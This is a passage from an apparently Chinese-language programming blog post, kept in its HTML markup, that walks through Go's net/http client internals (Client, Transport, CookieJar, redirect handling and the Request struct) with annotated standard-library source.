Response.Body.</span>    <span class="token comment" spellcheck="true">// A Timeout of zero means no timeout.</span>    Timeout time<span class="token punctuation">.</span>Duration<span class="token punctuation">}</span></code></pre><h4 id="http-DefaultClient"><a href="#http-DefaultClient" class="headerlink" title="http.DefaultClient"></a>http.DefaultClient</h4><p><code>http.DefaultClient</code>是<code>http</code>包提供的默认的<code>Client</code>，<code>http.Get()</code>、<code>http.Post()</code>、<code>http.PostForm()</code>、<code>http.Head()</code>都是基于该默认结构体发送HTTP Request。</p><pre class=" language-go"><code class="language-go"><span class="token comment" spellcheck="true">// DefaultClient is the default Client and is used by Get, Head, and Post.</span><span class="token keyword">var</span> DefaultClient <span class="token operator">=</span> <span class="token operator">&amp;</span>Client<span class="token punctuation">{</span><span class="token punctuation">}</span></code></pre><h2 id="二、RoundTripper"><a href="#二、RoundTripper" class="headerlink" title="二、RoundTripper"></a>二、RoundTripper</h2><p><code>RoundTripper</code>是一个接口，其<code>RoundTrip()</code>方法用于建立<code>TCP</code>链接、发送<code>HTTP Request</code>返回<code>HTTP Response</code>等。</p><pre class=" language-go"><code class="language-go"><span class="token comment" spellcheck="true">// RoundTripper is an interface representing the ability to execute a</span><span class="token comment" spellcheck="true">// single HTTP transaction, obtaining the Response for a given Request.</span><span class="token comment" spellcheck="true">//</span><span class="token comment" spellcheck="true">// A RoundTripper must be safe for concurrent use by multiple goroutines.</span><span class="token keyword">type</span> RoundTripper <span class="token keyword">interface</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// RoundTrip executes a single HTTP transaction, returning</span>    <span class="token comment" spellcheck="true">// a Response for the provided Request.</span>    <span class="token function">RoundTrip</span><span class="token punctuation">(</span><span class="token operator">*</span>Request<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token operator">*</span>Response<span class="token punctuation">,</span> <span class="token builtin">error</span><span class="token punctuation">)</span><span class="token punctuation">}</span></code></pre><h4 id="http-Transport"><a href="#http-Transport" class="headerlink" title="http.Transport"></a><strong>http.Transport</strong></h4><p><code>http.Transport</code>是<code>http</code>包提供的一个实现了<code>RoundTripper</code>接口的结构体。</p><p>我们可以使用该结构体定制化<code>HTTP</code>链接，如<code>HTTP</code>连接数、<code>TLS</code>、<code>HTTP</code>代理等,并在实例化<code>Client</code>时传入。。</p><p><code>http</code>包同时也提供了默认的<code>DefaultTransport</code>，主要用于默认的<code>DefaultClient</code>使用。</p><pre class=" language-go"><code class="language-go"><span class="token comment" spellcheck="true">// DefaultTransport is the default implementation of Transport and is used by DefaultClient. </span><span class="token keyword">var</span> DefaultTransport RoundTripper <span class="token operator">=</span> <span class="token operator">&amp;</span>Transport<span class="token punctuation">{</span>    Proxy<span class="token punctuation">:</span> ProxyFromEnvironment<span class="token punctuation">,</span>    DialContext<span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token operator">&amp;</span>net<span class="token punctuation">.</span>Dialer<span class="token punctuation">{</span>        Timeout<span class="token punctuation">:</span>   <span class="token number">30</span> <span class="token operator">*</span> time<span class="token punctuation">.</span>Second<span class="token punctuation">,</span>        KeepAlive<span class="token punctuation">:</span> <span class="token number">30</span> <span class="token operator">*</span> time<span class="token punctuation">.</span>Second<span class="token punctuation">,</span>        DualStack<span class="token punctuation">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span>DialContext<span class="token punctuation">,</span>    ForceAttemptHTTP2<span class="token punctuation">:</span>     <span class="token boolean">true</span><span class="token punctuation">,</span>    MaxIdleConns<span class="token punctuation">:</span>          <span class="token number">100</span><span class="token punctuation">,</span>    IdleConnTimeout<span class="token punctuation">:</span>       <span class="token number">90</span> <span class="token operator">*</span> time<span class="token punctuation">.</span>Second<span class="token punctuation">,</span>    TLSHandshakeTimeout<span class="token punctuation">:</span>   <span class="token number">10</span> <span class="token operator">*</span> time<span class="token punctuation">.</span>Second<span class="token punctuation">,</span>    ExpectContinueTimeout<span class="token punctuation">:</span> <span class="token number">1</span> <span class="token operator">*</span> time<span class="token punctuation">.</span>Second<span class="token punctuation">,</span><span class="token punctuation">}</span></code></pre><h2 id="三、CookieJar"><a href="#三、CookieJar" class="headerlink" title="三、CookieJar"></a>三、CookieJar</h2><p><code>CookieJar</code>主要用于存取<code>Cookie</code>，其内部使用嵌套的<code>map</code>来存储<code>Cookie</code>。</p><ul><li><code>map[string]map[string]Cookie</code><ul><li>最外层<code>map</code>的<code>key</code>是<code>URL</code>字符串。</li><li>内层<code>map</code>的<code>key</code>是<code>id</code>值（<code>id</code>由<code>Domain+Path+Cookie的键名</code>组成）。</li><li>内层<code>map</code>的值是<code>Cookie</code>结构体，即一个<code>Cookie</code>键值对。</li></ul></li></ul><p><code>CookieJar</code>是一个接口,声明了两个方法。</p><ul><li><code>SetCookies()</code><ul><li>提供向<code>CookieJar</code>中存储<code>Cookie</code>的接口。</li></ul></li><li><code>Cookies()</code><ul><li>提供从<code>CookieJar</code>中获取对应URL的<code>Cookie</code>键值对的接口。</li></ul></li></ul><pre class=" language-go"><code class="language-go"><span class="token comment" spellcheck="true">// A CookieJar manages storage and use of cookies in HTTP requests.</span><span class="token comment" spellcheck="true">//</span><span class="token comment" spellcheck="true">// Implementations of CookieJar must be safe for concurrent use by multiple goroutines.</span><span class="token comment" spellcheck="true">//</span><span class="token comment" spellcheck="true">// The net/http/cookiejar package provides a CookieJar implementation.</span><span class="token keyword">type</span> CookieJar <span class="token keyword">interface</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// SetCookies handles the receipt of the cookies in a reply for the</span>    <span class="token comment" spellcheck="true">// given URL.  It may or may not choose to save the cookies, depending</span>    <span class="token comment" spellcheck="true">// on the jar's policy and implementation.</span>    <span class="token function">SetCookies</span><span class="token punctuation">(</span>u <span class="token operator">*</span>url<span class="token punctuation">.</span>URL<span class="token punctuation">,</span> cookies <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">*</span>Cookie<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">// Cookies returns the cookies to send in a request for the given URL.</span>    <span class="token comment" spellcheck="true">// It is up to the implementation to honor the standard cookie use</span>    <span class="token comment" spellcheck="true">// restrictions such as in RFC 6265.</span>    <span class="token function">Cookies</span><span class="token punctuation">(</span>u <span class="token operator">*</span>url<span class="token punctuation">.</span>URL<span class="token punctuation">)</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">*</span>Cookie<span class="token punctuation">}</span></code></pre><p><strong>http.Cookie</strong></p><p>使用<code>Cookie</code>结构体来表示一个<code>Cookie</code>键值对。</p><pre class=" language-go"><code class="language-go"><span class="token keyword">type</span> Cookie <span class="token keyword">struct</span> <span class="token punctuation">{</span>    Name  <span class="token builtin">string</span>    Value <span class="token builtin">string</span>    Path       <span class="token builtin">string</span>    <span class="token comment" spellcheck="true">// optional</span>    Domain     <span class="token builtin">string</span>    <span class="token comment" spellcheck="true">// optional</span>    Expires    time<span class="token punctuation">.</span>Time <span class="token comment" spellcheck="true">// optional</span>    RawExpires <span class="token builtin">string</span>    <span class="token comment" spellcheck="true">// for reading cookies only</span>    <span class="token comment" spellcheck="true">// MaxAge=0 means no 'Max-Age' attribute specified.</span>    <span class="token comment" spellcheck="true">// MaxAge&lt;0 means delete cookie now, equivalently 'Max-Age: 0'</span>    <span class="token comment" spellcheck="true">// MaxAge>0 means Max-Age attribute present and given in seconds</span>    MaxAge   <span class="token builtin">int</span>    Secure   <span class="token builtin">bool</span>    HttpOnly <span class="token builtin">bool</span>    SameSite SameSite    Raw      <span class="token builtin">string</span>    Unparsed <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">string</span> <span class="token comment" spellcheck="true">// Raw text of unparsed attribute-value pairs</span><span class="token punctuation">}</span></code></pre><h4 id="cookiejar-Jar"><a href="#cookiejar-Jar" class="headerlink" title="cookiejar.Jar"></a><strong>cookiejar.Jar</strong></h4><p><code>net/http/cookiejar</code>包中<code>Jar</code>结构体提供了<code>http.CookieJar</code>的实现，并且提供<code>cookiejar.New()</code>实例化一个<code>CookieJar</code>。</p><pre class=" language-go"><code class="language-go"><span class="token comment" spellcheck="true">// Jar implements the http.CookieJar interface from the net/http package.</span><span class="token keyword">type</span> Jar <span class="token keyword">struct</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// 定义了</span>    psList PublicSuffixList    <span class="token comment" spellcheck="true">// mu locks the remaining fields.</span>    mu sync<span class="token punctuation">.</span>Mutex    <span class="token comment" spellcheck="true">// entries is a set of entries, keyed by their eTLD+1 and subkeyed by</span>    <span class="token comment" spellcheck="true">// their name/domain/path.</span>    entries <span class="token keyword">map</span><span class="token punctuation">[</span><span class="token builtin">string</span><span class="token punctuation">]</span><span class="token keyword">map</span><span class="token punctuation">[</span><span class="token builtin">string</span><span class="token punctuation">]</span>entry    <span class="token comment" spellcheck="true">// nextSeqNum is the next sequence number assigned to a new cookie</span>    <span class="token comment" spellcheck="true">// created SetCookies.</span>    nextSeqNum <span class="token builtin">uint64</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">// New returns a new cookie jar. A nil *Options is equivalent to a zero Options.</span><span class="token keyword">func</span> <span class="token function">New</span><span class="token punctuation">(</span>o <span class="token operator">*</span>Options<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token operator">*</span>Jar<span class="token punctuation">,</span> <span class="token builtin">error</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    jar <span class="token operator">:=</span> <span class="token operator">&amp;</span>Jar<span class="token punctuation">{</span>        entries<span class="token punctuation">:</span> <span class="token function">make</span><span class="token punctuation">(</span><span class="token keyword">map</span><span class="token punctuation">[</span><span class="token builtin">string</span><span class="token punctuation">]</span><span class="token keyword">map</span><span class="token punctuation">[</span><span class="token builtin">string</span><span class="token punctuation">]</span>entry<span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> o <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>        jar<span class="token punctuation">.</span>psList <span class="token operator">=</span> o<span class="token punctuation">.</span>PublicSuffixList    <span class="token punctuation">}</span>    <span class="token keyword">return</span> jar<span class="token punctuation">,</span> <span class="token boolean">nil</span><span class="token punctuation">}</span></code></pre><p><strong><code>http.Client</code>如何处理<code>Cookie</code>？</strong></p><ul><li><p>实例化<code>http.Client</code>时，</p><ul><li><p>若没有传入<code>CookieJar</code>，即<code>Jar==nil</code>，那么发送的<code>HTTP Request</code>不会携带<code>Cookie</code>。</p></li><li><p>若传入了<code>CookieJar</code>:</p><ul><li><p>在发送<code>HTTP Request</code>时，会调用<code>CookieJar</code>的<code>Cookies()</code>方法去查询是否有<code>Cookie</code>，查询到则添加到<code>HTTP Request</code>中。</p></li><li><p>在接收到<code>HTTP Response</code>时，会调用<code>CookieJar</code>的<code>SetCookies()</code>方法将返回消息的<code>Set-Cookie</code>头部的<code>Cookie</code>存储到<code>CookieJar</code>中。</p><pre class=" language-go"><code class="language-go"><span class="token keyword">func</span> <span class="token punctuation">(</span>c <span class="token operator">*</span>Client<span class="token punctuation">)</span> <span class="token function">send</span><span class="token punctuation">(</span>req <span class="token operator">*</span>Request<span class="token punctuation">,</span> deadline time<span class="token punctuation">.</span>Time<span class="token punctuation">)</span> <span class="token punctuation">(</span>resp <span class="token operator">*</span>Response<span class="token punctuation">,</span> didTimeout <span class="token keyword">func</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token builtin">bool</span><span class="token punctuation">,</span> err <span class="token builtin">error</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">if</span> c<span class="token punctuation">.</span>Jar <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>      <span class="token keyword">for</span> <span class="token boolean">_</span><span class="token punctuation">,</span> cookie <span class="token operator">:=</span> <span class="token keyword">range</span> c<span class="token punctuation">.</span>Jar<span class="token punctuation">.</span><span class="token function">Cookies</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>URL<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">//从CookieJar中查询cookie。</span>          req<span class="token punctuation">.</span><span class="token function">AddCookie</span><span class="token punctuation">(</span>cookie<span class="token punctuation">)</span>   <span class="token comment" spellcheck="true">//添加cookie到HTTP Request头部</span>      <span class="token punctuation">}</span>  <span class="token punctuation">}</span>  resp<span class="token punctuation">,</span> didTimeout<span class="token punctuation">,</span> err <span class="token operator">=</span> <span class="token function">send</span><span class="token punctuation">(</span>req<span class="token punctuation">,</span> c<span class="token punctuation">.</span><span class="token function">transport</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> deadline<span class="token punctuation">)</span>  <span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>      <span class="token keyword">return</span> <span class="token boolean">nil</span><span class="token punctuation">,</span> didTimeout<span class="token punctuation">,</span> err  <span class="token punctuation">}</span>  <span class="token keyword">if</span> c<span class="token punctuation">.</span>Jar <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>      <span class="token keyword">if</span> rc <span class="token operator">:=</span> resp<span class="token punctuation">.</span><span class="token function">Cookies</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">len</span><span class="token punctuation">(</span>rc<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0</span> <span class="token punctuation">{</span>   <span class="token comment" spellcheck="true">//http.Response的Cookies()方法可以获取返回消息的Set-Cookie头部的值。</span>          c<span class="token punctuation">.</span>Jar<span class="token punctuation">.</span><span class="token function">SetCookies</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>URL<span class="token punctuation">,</span> rc<span class="token punctuation">)</span>   <span class="token comment" spellcheck="true">//保存Cookie到CookieJar</span>      <span class="token punctuation">}</span>  <span class="token punctuation">}</span>  <span class="token keyword">return</span> resp<span class="token punctuation">,</span> <span class="token boolean">nil</span><span class="token punctuation">,</span> <span class="token boolean">nil</span><span class="token punctuation">}</span></code></pre></li></ul></li></ul></li></ul><h2 id="四、Redirect"><a href="#四、Redirect" class="headerlink" title="四、Redirect"></a>四、Redirect</h2><p><strong><code>http.Client</code>处理重定向的行为:</strong></p><ul><li>发送<code>HTTP Request</code>，接收到<code>HTTP Response</code>后会调用<code>redirectBehavior()</code>判断是否需要重定向，函数根据HTTP响应码判断。</li><li>若需要重定向则构建重定向请求，从<code>HTTP Response</code>的<code>Location</code>头部获取要重定向到的地址，设置重定向请求的<code>Referer</code>头部等。</li><li>然后在发送重定向请求之前会调用在实例化<code>http.Client</code>时传入的<code>checkRedirect</code>函数。<ul><li>如果不想进行重定向，则在<code>checkRedirect</code>返回<code>ErrUseLastResponse</code>即可。</li></ul></li></ul><pre class=" language-go"><code class="language-go"><span class="token keyword">func</span> <span class="token punctuation">(</span>c <span class="token operator">*</span>Client<span class="token punctuation">)</span> <span class="token function">do</span><span class="token punctuation">(</span>req <span class="token operator">*</span>Request<span class="token punctuation">)</span> <span class="token punctuation">(</span>retres <span class="token operator">*</span>Response<span class="token punctuation">,</span> reterr <span class="token builtin">error</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token operator">...</span><span class="token operator">...</span>    <span class="token keyword">for</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// 重定向时才会执行该if代码段。</span>        <span class="token keyword">if</span> <span class="token function">len</span><span class="token punctuation">(</span>reqs<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0</span> <span class="token punctuation">{</span>            loc <span class="token operator">:=</span> resp<span class="token punctuation">.</span>Header<span class="token punctuation">.</span><span class="token function">Get</span><span class="token punctuation">(</span><span class="token string">"Location"</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> loc <span class="token operator">==</span> <span class="token string">""</span> <span class="token punctuation">{</span>                resp<span class="token punctuation">.</span><span class="token function">closeBody</span><span class="token punctuation">(</span><span class="token punctuation">)</span>                <span class="token keyword">return</span> <span class="token boolean">nil</span><span class="token punctuation">,</span> <span class="token function">uerr</span><span class="token punctuation">(</span>fmt<span class="token punctuation">.</span><span class="token function">Errorf</span><span class="token punctuation">(</span><span class="token string">"%d response missing Location header"</span><span class="token punctuation">,</span> resp<span class="token punctuation">.</span>StatusCode<span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token punctuation">}</span>            u<span class="token punctuation">,</span> err <span class="token operator">:=</span> req<span class="token punctuation">.</span>URL<span class="token punctuation">.</span><span class="token function">Parse</span><span class="token punctuation">(</span>loc<span class="token punctuation">)</span>            <span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>                resp<span class="token punctuation">.</span><span class="token function">closeBody</span><span class="token punctuation">(</span><span class="token punctuation">)</span>                <span class="token keyword">return</span> <span class="token boolean">nil</span><span class="token punctuation">,</span> <span class="token function">uerr</span><span class="token punctuation">(</span>fmt<span class="token punctuation">.</span><span class="token function">Errorf</span><span class="token punctuation">(</span><span class="token string">"failed to parse Location header %q: %v"</span><span class="token punctuation">,</span> loc<span class="token punctuation">,</span> err<span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token punctuation">}</span>            host <span class="token operator">:=</span> <span class="token string">""</span>            <span class="token keyword">if</span> req<span class="token punctuation">.</span>Host <span class="token operator">!=</span> <span class="token string">""</span> <span class="token operator">&amp;&amp;</span> req<span class="token punctuation">.</span>Host <span class="token operator">!=</span> req<span class="token punctuation">.</span>URL<span class="token punctuation">.</span>Host <span class="token punctuation">{</span>                <span class="token keyword">if</span> u<span class="token punctuation">,</span> <span class="token boolean">_</span> <span class="token operator">:=</span> url<span class="token punctuation">.</span><span class="token function">Parse</span><span class="token punctuation">(</span>loc<span class="token punctuation">)</span><span class="token punctuation">;</span> u <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>u<span class="token punctuation">.</span><span class="token function">IsAbs</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    host <span class="token operator">=</span> req<span class="token punctuation">.</span>Host                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>            ireq <span class="token operator">:=</span> reqs<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>            req <span class="token operator">=</span> <span class="token operator">&amp;</span>Request<span class="token punctuation">{</span>                Method<span class="token punctuation">:</span>   redirectMethod<span class="token punctuation">,</span>                Response<span class="token punctuation">:</span> resp<span class="token punctuation">,</span>                URL<span class="token punctuation">:</span>      u<span class="token punctuation">,</span>                Header<span class="token punctuation">:</span>   <span class="token function">make</span><span class="token punctuation">(</span>Header<span class="token punctuation">)</span><span class="token punctuation">,</span>                Host<span class="token punctuation">:</span>     host<span class="token punctuation">,</span>                Cancel<span class="token punctuation">:</span>   ireq<span class="token punctuation">.</span>Cancel<span class="token punctuation">,</span>                ctx<span class="token punctuation">:</span>      ireq<span class="token punctuation">.</span>ctx<span class="token punctuation">,</span>            <span class="token punctuation">}</span>            <span class="token operator">...</span><span class="token operator">...</span>            <span class="token comment" spellcheck="true">// Copy original headers before setting the Referer,in case the user set Referer on their first request.</span>            <span class="token comment" spellcheck="true">// If they really want to override, they can do it in their CheckRedirect func.</span>            <span class="token function">copyHeaders</span><span class="token punctuation">(</span>req<span class="token punctuation">)</span>            <span class="token comment" spellcheck="true">// 设置重定向请求的Referer头部</span>            <span class="token keyword">if</span> ref <span class="token operator">:=</span> <span class="token function">refererForURL</span><span class="token punctuation">(</span>reqs<span class="token punctuation">[</span><span class="token function">len</span><span class="token punctuation">(</span>reqs<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>URL<span class="token punctuation">,</span> req<span class="token punctuation">.</span>URL<span class="token punctuation">)</span><span class="token punctuation">;</span> ref <span class="token operator">!=</span> <span class="token string">""</span> <span class="token punctuation">{</span>                req<span class="token punctuation">.</span>Header<span class="token punctuation">.</span><span class="token function">Set</span><span class="token punctuation">(</span><span class="token string">"Referer"</span><span class="token punctuation">,</span> ref<span class="token punctuation">)</span>            <span class="token punctuation">}</span>            <span class="token comment" spellcheck="true">// 在发送重定向HTTP Request之前，调用http.Client中的checkRedirect方法。</span>            err <span class="token operator">=</span> c<span class="token punctuation">.</span><span class="token function">checkRedirect</span><span class="token punctuation">(</span>req<span class="token punctuation">,</span> reqs<span class="token punctuation">)</span>            <span class="token comment" spellcheck="true">// 若不想进行重定向，只需要在checkRedirect函数中返回ErrUseLastResponse错误即可。</span>            <span class="token keyword">if</span> err <span class="token operator">==</span> ErrUseLastResponse <span class="token punctuation">{</span>                <span class="token keyword">return</span> resp<span class="token punctuation">,</span> <span class="token boolean">nil</span>            <span class="token punctuation">}</span>            <span class="token operator">...</span><span class="token operator">...</span>        <span class="token punctuation">}</span>        <span class="token comment" spellcheck="true">//非重定向HTTP Request会从这里开始执行</span>        reqs <span class="token operator">=</span> <span class="token function">append</span><span class="token punctuation">(</span>reqs<span class="token punctuation">,</span> req<span class="token punctuation">)</span>        <span class="token keyword">var</span> err <span class="token builtin">error</span>        <span class="token keyword">var</span> didTimeout <span class="token keyword">func</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token builtin">bool</span>        <span class="token keyword">if</span> resp<span class="token punctuation">,</span> didTimeout<span class="token punctuation">,</span> err <span class="token operator">=</span> c<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span>req<span class="token punctuation">,</span> deadline<span class="token punctuation">)</span><span class="token punctuation">;</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token boolean">nil</span><span class="token punctuation">,</span> <span class="token function">uerr</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span>        <span class="token punctuation">}</span>        <span class="token keyword">var</span> shouldRedirect <span class="token builtin">bool</span>        redirectMethod<span class="token punctuation">,</span> shouldRedirect<span class="token punctuation">,</span> includeBody <span class="token operator">=</span> <span class="token function">redirectBehavior</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>Method<span class="token punctuation">,</span> resp<span class="token punctuation">,</span> reqs<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">//根据响应码判断是否需要重定向</span>        <span class="token keyword">if</span> <span class="token operator">!</span>shouldRedirect <span class="token punctuation">{</span>            <span class="token keyword">return</span> resp<span class="token punctuation">,</span> <span class="token boolean">nil</span>        <span class="token punctuation">}</span>        req<span class="token punctuation">.</span><span class="token function">closeBody</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><ul><li><p><strong><code>redirectBehavior()</code></strong></p><p>  响应码为<code>301</code>、<code>302</code>、<code>303</code>、<code>307</code>、<code>308</code>都会进行跳转。</p><pre class=" language-go"><code class="language-go"><span class="token comment" spellcheck="true">// redirectBehavior describes what should happen when the</span><span class="token comment" spellcheck="true">// client encounters a 3xx status code from the server</span><span class="token keyword">func</span> <span class="token function">redirectBehavior</span><span class="token punctuation">(</span>reqMethod <span class="token builtin">string</span><span class="token punctuation">,</span> resp <span class="token operator">*</span>Response<span class="token punctuation">,</span> ireq <span class="token operator">*</span>Request<span class="token punctuation">)</span> <span class="token punctuation">(</span>redirectMethod <span class="token builtin">string</span><span class="token punctuation">,</span> shouldRedirect<span class="token punctuation">,</span> includeBody <span class="token builtin">bool</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">switch</span> resp<span class="token punctuation">.</span>StatusCode <span class="token punctuation">{</span>    <span class="token keyword">case</span> <span class="token number">301</span><span class="token punctuation">,</span> <span class="token number">302</span><span class="token punctuation">,</span> <span class="token number">303</span><span class="token punctuation">:</span>        redirectMethod <span class="token operator">=</span> reqMethod        shouldRedirect <span class="token operator">=</span> <span class="token boolean">true</span>        includeBody <span class="token operator">=</span> <span class="token boolean">false</span>        <span class="token keyword">if</span> reqMethod <span class="token operator">!=</span> <span class="token string">"GET"</span> <span class="token operator">&amp;&amp;</span> reqMethod <span class="token operator">!=</span> <span class="token string">"HEAD"</span> <span class="token punctuation">{</span>            redirectMethod <span class="token operator">=</span> <span class="token string">"GET"</span>        <span class="token punctuation">}</span>    <span class="token keyword">case</span> <span class="token number">307</span><span class="token punctuation">,</span> <span class="token number">308</span><span class="token punctuation">:</span>        redirectMethod <span class="token operator">=</span> reqMethod        shouldRedirect <span class="token operator">=</span> <span class="token boolean">true</span>        includeBody <span class="token operator">=</span> <span class="token boolean">true</span>        <span class="token comment" spellcheck="true">// Treat 307 and 308 specially, since they're new in Go 1.8, and they also require re-sending the request body.</span>        <span class="token keyword">if</span> resp<span class="token punctuation">.</span>Header<span class="token punctuation">.</span><span class="token function">Get</span><span class="token punctuation">(</span><span class="token string">"Location"</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">""</span> <span class="token punctuation">{</span>            shouldRedirect <span class="token operator">=</span> <span class="token boolean">false</span>            <span class="token keyword">break</span>        <span class="token punctuation">}</span>        <span class="token keyword">if</span> ireq<span class="token punctuation">.</span>GetBody <span class="token operator">==</span> <span class="token boolean">nil</span> <span class="token operator">&amp;&amp;</span> ireq<span class="token punctuation">.</span><span class="token function">outgoingLength</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span> <span class="token punctuation">{</span>            shouldRedirect <span class="token operator">=</span> <span class="token boolean">false</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> redirectMethod<span class="token punctuation">,</span> shouldRedirect<span class="token punctuation">,</span> includeBody<span class="token punctuation">}</span></code></pre></li></ul><h2 id="五、http-Request"><a href="#五、http-Request" class="headerlink" title="五、http.Request"></a>五、http.Request</h2><p><strong><code>Request</code>结构体用于存储http请求消息，同时用于客户端和服务端。</strong></p><ul><li><p>在Client端，用于构造要发送的HTTP请求消息。（我们构造的<code>Request</code>结构体会被解析为<code>HTTP request</code>消息。）</p></li><li><p>在Server端，用于接收客户端发来的HTTP请求（即服务器会把<code>HTTP request</code>解析到<code>Request</code>结构体中）。</p><pre class=" language-go"><code class="language-go"><span class="token comment" spellcheck="true">// A Request represents an HTTP request received by a server</span><span class="token comment" spellcheck="true">// or to be sent by a client.</span><span class="token keyword">type</span> Request <span class="token keyword">struct</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// 存储HTTP的请求方法。</span>    <span class="token comment" spellcheck="true">// 在Client端，不进行指定时默认使用GET。</span>    <span class="token comment" spellcheck="true">// Server端用于存储客户端的请求方法。</span>    Method <span class="token builtin">string</span>    <span class="token comment" spellcheck="true">// 在Client端，URL结构体指明了要访问的服务器的URL信息。</span>    <span class="token comment" spellcheck="true">// 在Server端，保存解析了HTTP请求消息的请求行后的数据。请求的URI也会保存到RequestURI字段。</span>    URL <span class="token operator">*</span>url<span class="token punctuation">.</span>URL    <span class="token comment" spellcheck="true">//对于Client端，以下三个字段都将被忽略。客户端总是使用HTTP/1.1 or HTTP/2.</span>    <span class="token comment" spellcheck="true">//对于Server端，用于获取客户端HTTP请求的协议版本。    </span>    Proto      <span class="token builtin">string</span> <span class="token comment" spellcheck="true">// "HTTP/1.0"</span>    ProtoMajor <span class="token builtin">int</span>    <span class="token comment" spellcheck="true">// 1</span>    ProtoMinor <span class="token builtin">int</span>    <span class="token comment" spellcheck="true">// 0</span>    <span class="token comment" spellcheck="true">// 对于Client端，用于指定请求消息的请求头。</span>    <span class="token comment" spellcheck="true">// 对于Server端，存储解析HTTP消息请求头得到的数据。注：Host请求头不会被解析存储到其中，而会被解析到Request.Host字段中。</span>        <span class="token comment" spellcheck="true">//    Host: example.com</span>        <span class="token comment" spellcheck="true">//    accept-encoding: gzip, deflate</span>        <span class="token comment" spellcheck="true">//    Accept-Language: en-us</span>        <span class="token comment" spellcheck="true">//    fOO: Bar</span>        <span class="token comment" spellcheck="true">//    foo: two</span>        <span class="token comment" spellcheck="true">//</span>        <span class="token comment" spellcheck="true">// then</span>        <span class="token comment" spellcheck="true">//</span>        <span class="token comment" spellcheck="true">//    Header = map[string][]string{</span>        <span class="token comment" spellcheck="true">//        "Accept-Encoding": {"gzip, deflate"},</span>        <span class="token comment" spellcheck="true">//        "Accept-Language": {"en-us"},</span>        <span class="token comment" spellcheck="true">//        "Foo": {"Bar", "two"},</span>        <span class="token comment" spellcheck="true">//    }</span>    Header Header    <span class="token comment" spellcheck="true">//该字段代表HTTP请求消息的请求体。</span>    <span class="token comment" spellcheck="true">//对于Client，传入nil时，表示无请求体，例如GET请求就传入设为nil。POST等请求传入相应的请求体。客户端中Body的Close()方法由Transport负责调用。</span>    <span class="token comment" spellcheck="true">//对于Server，Body永远不为nil，但对于GET请求，读取Body会直接得到io.EOF。服务器端中Body的Close()方法由HTTP Server调用，而不是负责处理请求的ServeHTTP。</span>    Body io<span class="token punctuation">.</span>ReadCloser    <span class="token comment" spellcheck="true">//对于Server端,该字段无用。</span>    <span class="token comment" spellcheck="true">//对于Client端，函数用于获取Body的拷贝，用于需要多次使用一个Body时。</span>    GetBody <span class="token keyword">func</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>io<span class="token punctuation">.</span>ReadCloser<span class="token punctuation">,</span> <span class="token builtin">error</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">//HTTP request Body的长度（字节数）</span>    ContentLength <span class="token builtin">int64</span>    TransferEncoding <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">string</span>    Close <span class="token builtin">bool</span>    